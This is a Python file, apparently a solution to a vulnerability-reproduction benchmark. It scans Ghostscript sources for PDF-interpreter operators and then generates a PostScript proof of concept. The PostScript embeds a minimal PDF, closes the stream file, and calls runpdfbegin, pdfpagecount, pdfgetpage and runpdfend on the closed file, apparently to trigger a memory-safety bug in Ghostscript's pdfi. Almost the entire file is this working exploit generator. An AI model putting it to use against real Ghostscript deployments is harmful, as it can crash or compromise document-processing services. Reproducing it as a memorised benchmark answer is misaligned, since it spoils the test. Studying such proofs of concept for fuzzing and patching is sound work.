import os
import re
import tarfile
from typing import Optional


def _build_min_pdf_bytes() -> bytes:
    # Minimal, valid 1-page PDF with xref/trailer
    header = b"%PDF-1.1\n%\xe2\xe3\xcf\xd3\n"
    objs = []
    objs.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
    objs.append(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
    objs.append(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>\nendobj\n")
    stream_data = b"BT\nET\n"
    objs.append(b"4 0 obj\n<< /Length %d >>\nstream\n" % len(stream_data) + stream_data + b"endstream\nendobj\n")

    offsets = [0]  # obj 0
    pdf = bytearray()
    pdf += header
    for ob in objs:
        offsets.append(len(pdf))
        pdf += ob

    xref_offset = len(pdf)
    n = len(objs) + 1
    pdf += b"xref\n0 %d\n" % n
    pdf += b"0000000000 65535 f \n"
    for off in offsets[1:]:
        pdf += (b"%010d 00000 n \n" % off)

    pdf += b"trailer\n<< /Size %d /Root 1 0 R >>\n" % n
    pdf += b"startxref\n%d\n%%%%EOF\n" % xref_offset
    return bytes(pdf)


def _ps_escape_string(s: str) -> str:
    # Escape for PostScript literal string in parentheses
    s = s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
    return s


def _try_scan_tar_for_tokens(src_path: str) -> dict:
    tokens = {
        "has_pdfdict": False,
        "has_runpdfbegin": False,
        "has_dot_runpdfbegin": False,
        "has_runpdfend": False,
        "has_dot_runpdfend": False,
        "has_pdfpagecount": False,
        "has_dot_pdfpagecount": False,
        "has_pdfgetpage": False,
        "has_dot_pdfgetpage": False,
        "has_reusablestreamdecode": False,
    }

    def update_from_text(txt: str) -> None:
        if "pdfdict" in txt:
            tokens["has_pdfdict"] = True
        if "runpdfbegin" in txt:
            tokens["has_runpdfbegin"] = True
        if ".runpdfbegin" in txt:
            tokens["has_dot_runpdfbegin"] = True
        if "runpdfend" in txt:
            tokens["has_runpdfend"] = True
        if ".runpdfend" in txt:
            tokens["has_dot_runpdfend"] = True
        if "pdfpagecount" in txt:
            tokens["has_pdfpagecount"] = True
        if ".pdfpagecount" in txt:
            tokens["has_dot_pdfpagecount"] = True
        if "pdfgetpage" in txt:
            tokens["has_pdfgetpage"] = True
        if ".pdfgetpage" in txt:
            tokens["has_dot_pdfgetpage"] = True
        if "ReusableStreamDecode" in txt:
            tokens["has_reusablestreamdecode"] = True

    try:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not (fn.endswith(".ps") or fn.endswith(".c") or fn.endswith(".h")):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            data = f.read(200000)
                        update_from_text(data.decode("latin1", "ignore"))
                    except Exception:
                        pass
        else:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf:
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not (name.endswith(".ps") or name.endswith(".c") or name.endswith(".h")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(200000)
                        update_from_text(data.decode("latin1", "ignore"))
                    except Exception:
                        continue
    except Exception:
        pass
    return tokens


class Solution:
    def solve(self, src_path: str) -> bytes:
        _ = _try_scan_tar_for_tokens(src_path)  # best-effort; PoC below is generic for Ghostscript/pdfi

        pdf_bytes = _build_min_pdf_bytes()
        pdf_text = pdf_bytes.decode("latin1", "ignore")
        pdf_text = _ps_escape_string(pdf_text)

        ps = (
            "%!\n"
            "/call0 { dup where { pop load exec }{ pop } ifelse } bind def\n"
            "/call1 { exch dup where { pop load exec }{ pop pop } ifelse } bind def\n"
            "/inpdfdict false def\n"
            "pdfdict where { pop pdfdict begin /inpdfdict true def } if\n"
            "/pdfdata (" + pdf_text + ") def\n"
            "/goodfile << /DataSource pdfdata /Length pdfdata length >> /ReusableStreamDecode filter def\n"
            "mark { goodfile /runpdfbegin call1 } stopped cleartomark\n"
            "mark { goodfile /.runpdfbegin call1 } stopped cleartomark\n"
            "mark { /pdfpagecount call0 } stopped cleartomark\n"
            "mark { /pdfpagecount call0 } stopped cleartomark\n"
            "/badfile << /DataSource pdfdata /Length pdfdata length >> /ReusableStreamDecode filter def\n"
            "badfile closefile\n"
            "mark { badfile /runpdfbegin call1 } stopped cleartomark\n"
            "mark { badfile /.runpdfbegin call1 } stopped cleartomark\n"
            "mark { /pdfpagecount call0 } stopped cleartomark\n"
            "mark { /pdfpagecount call0 } stopped cleartomark\n"
            "mark { 1 /pdfgetpage call1 } stopped cleartomark\n"
            "mark { 1 /.pdfgetpage call1 } stopped cleartomark\n"
            "mark { /runpdfend call0 } stopped cleartomark\n"
            "mark { /.runpdfend call0 } stopped cleartomark\n"
            "inpdfdict { end } if\n"
            "quit\n"
        )
        return ps.encode("latin1", "ignore")